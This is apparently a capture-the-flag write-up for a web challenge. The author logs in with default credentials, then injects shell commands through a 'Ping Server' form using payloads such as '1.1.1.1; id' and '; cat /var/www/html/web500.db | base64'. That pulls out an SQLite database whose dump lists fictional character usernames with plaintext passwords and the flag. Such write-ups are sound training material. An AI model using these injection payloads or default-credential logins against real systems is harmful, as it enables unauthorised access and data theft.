# web500

## Description
They told me make it hard, so I did.

http://44.197.231.105:3025

## Solve
Visiting the URL we see a login panel in the top corner... lets try some default credentials like `admin:admin`

Ok nice! We are in and there is a "Ping Server" page. This looks like possible command injection!

If we enter `1.1.1.1` in the box and submit we see terminal output:
```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 96ms
```
Let's try terminating the `ping` command and running our own command by entering `1.1.1.1; id`:
```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 96ms

uid=1337(challengeUser) gid=1337(challengeUser) groups=1337(challengeUser)
```
Okay we can skip pinging the host and just run our commands, lets take a look at the directory by running `;ls -la`:
```
total 8
drwxr-xr-x.  5 root root   81 Sep 26 17:50 .
dr-xr-xr-x. 17 root root   50 Dec 11 00:56 ..
-rw-rw-r--.  1 root root 3093 Sep  7 19:56 main.py
drwxrwxr-x.  2 root root   56 Sep  7 19:56 services
drwxrwxr-x.  4 root root   35 Sep  7 19:56 static
-rw-rw-r--.  1 root root  196 Sep 26 17:44 step2
drwxrwxr-x.  6 root root   66 Sep  7 19:56 templates
```
I kept looking through directories and eventually found something interesting via `; ls -la /var/www/html/`:
```
drwxr-xr-x. 2 root root    28 Sep 26 17:50 .
drwxr-xr-x. 3 root root    18 Sep 26 17:50 ..
-rw-rw-r--. 1 root root  2748 Sep  7 19:56 index.php
-rw-rw-r--. 1 root root 12288 Sep  7 19:56 web500.db
```
Since this is an SQLite database we can't just `cat` it out. I also found out `sqlite` isn't installed to query the DB. I used `; cat /var/www/html/web500.db | base64` to encode it in base64 and bring to my local machine. There I decoded it with `echo "<base64>"" | base64 -d > web500.db`
```
user@arch:~/cyber/ctf/mitre-2022/web/web500$ sqlite3 web500.db 
SQLite version 3.40.0 2022-11-16 12:10:08
Enter ".help" for usage hints.
sqlite> .tables
ACCOUNTS
sqlite> SELECT * FROM ACCOUNTS;
|Thor|Odenson|thor|Avenger|Asgard|GodofLightning1!
|Loki| |loki|Villain|Asgard|Mischief$
|Carol|Danvers|cmarvel|Avenger|Earth|HateKree!
|T'Challa| |panther|Avenger|Earth|WakandaForever!
|Shuri||shuri|Wakanda|Earth|WakandaPrince$$
|Peter|Parker|spidy|Avenger|Earth|Web$hooter
|Tony|Stark|ironman|Avenger|Earth|$acrificed1T
|Pepper|Pots|pots|Civilian|Earth|MrsIronman$1
|Bruce|Banner|hulk|Avenger|Earth|$mashEverything!
|Clint|Barton|hawkeye|Avenger|Earth|EagleEye1!
|Thanos| |thanos|Villain|Titan|InfinityStone$
|Vision| |vision|Avenger|Computer/Mind-Stone/Earth|Mind$tone
|Yon-Rogg| |rogg|Villain|Kree|BadGuy101
|Rocket|Racoon|rocket|Guardian of Galaxy|Halfworld|NotaRat!
|Peter|Quill|starlord|Guardian of Galaxy|Earth|Blue$ky!!72
|Groot|Groot|groot|Guardian of Galaxy|PlanetX|IamGr00t!
|Yondu|Udonta|yondu|Guardian of Galaxy|Earth-691|WhistleArrow!
|Drax|Destroyer|drax|Guardian of Galaxy|Earth|KillThano$
|Gamora|Titan|gamora|Guardian of Galaxy|Zehoberei|Soul$tone
|Nebula| |nebula|Guardian of Galaxy|Luphomoids|BadtoGood1
|Corvus|Glaive|corvus|Black Order|Angargal|$killedWarror
|Proxima|Midnight|proxima|Black Order|Angargal|EnergySpear!
|Cull|Obsidian|cull|Black Order|Angargal|$trongCreature
|Ebony|Maw|ebony|Black Order|Angargal|VoldemortWannaBe!
|Steven|Strange|drstrange|Avenger|Earth|Time$tone
|Bucky|Barnes|wintersolider|Avenger|Earth|MetalArm1!
|Sam|Wilson|falcon|Avenger|Earth|NewCap!
|Steve|Rogers|captain|Avenger|Earth|StarsandStripes!
|Wanda|Maximoff|witch|Avenger|Earth|Vision$GF
|Nick|Fury|fury|Shield|Earth|OneEye!
|Scott|Lang|antman|Avenger|Earth|TinyDude!
|Hope|Pym|wasp|Avenger|Earth|TinyGril!
|James|Rhodes|warmachine|Avenger|Earth|BigGunRox!
|Valkyrie| |valkyrie|Valkyrie|Asgard|ChooseroftheSlain!
|Happy|Hogan|hogan|Civilian|Earth|TonysAssistant!
|Odin|Odenson|odin|King|Asgard|KingofAsgard!
|Ultron| |ultron|Villain|Computer|WhatamI?
|Ronan|Accuser|ronan|Villain|Hala|KreeEmpire$
|Charles|Xavier|professorx|X-Men|Earth|Telepath$
|Scott|Summers|cyclops|X-Men|Earth|Lazer$aretheway
|Robert|Drake|iceman|X-Men|Earth|IceIceBaby1
|Henry|McCoy|beast|X-Men|Earth|ImaBea$t
|Logan|Howlett|wolverine|X-Men|Earth|MetalClaw$
|Piotr|Rasputin|colossus|X-Men|Earth|MetalMan!
|Jean|Grey|pheonix|X-Men|Earth|PhoenixForce!
|Max|Eisenhardt|magneto|Villain|Earth|MetalControl!
|Brianna|Hildebrands|warhead|X-Men|Earth|TennageW@rH3ad
|Wade|Wilson|deadpool|Independent|Earth|NotXmen!
|Natasha|Romanoff|widow|Avenger|Earth|Hulk$mash
|Natahan|Summers|cable|X-Force|Future|MetalControl!
|CORTEX|USER|CORTEXUSER|CORTEX|SomethingThatPeopleWouldNeverGuessSoTheyHaveToUseActualInjectionToGetThis|MCA{c706a97ac54c0d362cd188153d40d0791fa58899}
sqlite> 
```

## Flag
```
MCA{c706a97ac54c0d362cd188153d40d0791fa58899}
```